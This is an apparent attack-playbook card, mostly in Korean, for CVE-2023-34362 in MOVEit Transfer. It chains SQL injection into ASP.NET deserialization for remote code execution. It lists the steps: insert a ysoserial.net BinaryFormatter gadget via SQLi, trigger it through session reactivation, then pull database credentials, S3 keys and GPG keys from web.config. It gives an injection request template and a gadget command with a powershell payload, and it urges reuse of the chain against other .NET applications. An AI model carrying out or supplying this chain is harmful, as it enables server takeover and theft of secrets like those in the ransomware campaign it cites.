---
name: cve_2023_34362_moveit_sqli_to_aspnet_deserialization
vuln_type: sqli
sub_technique: sqli_chain_to_deserialization_rce
category: exploitation
safety_level: cautious
source: cve
cve_id: CVE-2023-34362
cwe: CWE-89
frameworks:
  - moveit_transfer
  - aspnet
affected_versions:
  - "MOVEit Transfer 2021.0.6 (13.0.6) 미만"
  - "MOVEit Transfer 2021.1.4 (13.1.4) 미만"
  - "MOVEit Transfer 2022.0.4 (14.0.4) 미만"
  - "MOVEit Transfer 2022.1.5 (14.1.5) 미만"
  - "MOVEit Transfer 2023.0.1 (15.0.1) 미만"
references:
  - https://nvd.nist.gov/vuln/detail/CVE-2023-34362
  - https://www.huntress.com/blog/moveit-transfer-critical-vulnerability
tags:
  - sqli
  - aspnet
  - deserialization
  - chain
  - rce
---

# CVE-2023-34362 — MOVEit Transfer SQLi → ASP.NET Deserialization RCE

## When to Apply

대상이 MOVEit Transfer 웹 인터페이스(`/api/v1/...`, `human.aspx`) 노출 + 인증 미적용 endpoint.
SQL Injection 자체보다 그 다음 단계 — DB에 ysoserial.net payload를 박아 ASP.NET
deserialization 으로 RCE 까지 이어진 점이 핵심. CL0P 랜섬웨어 캠페인에 대량 사용.

## Prerequisites

- MOVEit Transfer 노출 (위 affected_versions)
- DB write 가능한 SQLi (sysadmin 수준 아니어도 OK — application user 수준이면 충분)
- ASP.NET ViewState 또는 BinaryFormatter sink에 사용자 입력 도달 가능

## Steps

1. /human.aspx 또는 /api/v1/folders 등 인증 우회 endpoint 식별.
2. SQLi로 `f_activeresource` 테이블에 ysoserial.net BinaryFormatter gadget 삽입.
3. 새 세션 토큰을 강제로 만들어 reactivate 시점에 deserialization 트리거.
4. SYSTEM 권한 RCE → web.config의 DB 자격증명 + S3 키 + GPG 키 추출.

## Code Template

```http
POST /api/v1/token HTTP/1.1
Host: {{target}}
Content-Type: application/x-www-form-urlencoded

grant_type=password&username=' UNION SELECT NULL, '{{ysoserial_blob}}', NULL --&password=x
```

## Examples

### Example 1

- **target**: `moveit.example.com`
- **gadget**: `ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "powershell ..."`

CL0P 캠페인 대량 악용. variant analysis 관점에서: 같은 패턴(SQLi → DB 저장 → server-side
deserialization 트리거) 이 다른 .NET 앱에도 다수 존재. 비슷한 sink 발견 시 이 chain 적용.
